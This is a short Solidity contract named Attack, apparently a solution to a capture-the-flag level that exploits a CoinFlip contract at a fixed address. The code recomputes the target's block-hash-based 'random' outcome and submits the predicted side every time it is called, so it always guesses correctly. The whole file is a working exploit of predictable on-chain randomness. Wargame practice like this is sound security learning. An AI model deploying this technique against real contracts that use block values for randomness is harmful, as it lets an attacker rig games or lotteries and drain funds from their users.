// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./coinflip.sol";

contract Attack{

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    address instance = 0xf4F075D7180eFD0D28dAa3EBe91A1EeB886e7473;
    CoinFlip public coinflip = CoinFlip(instance);

    function flip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;
        coinflip.flip(side);
    }
}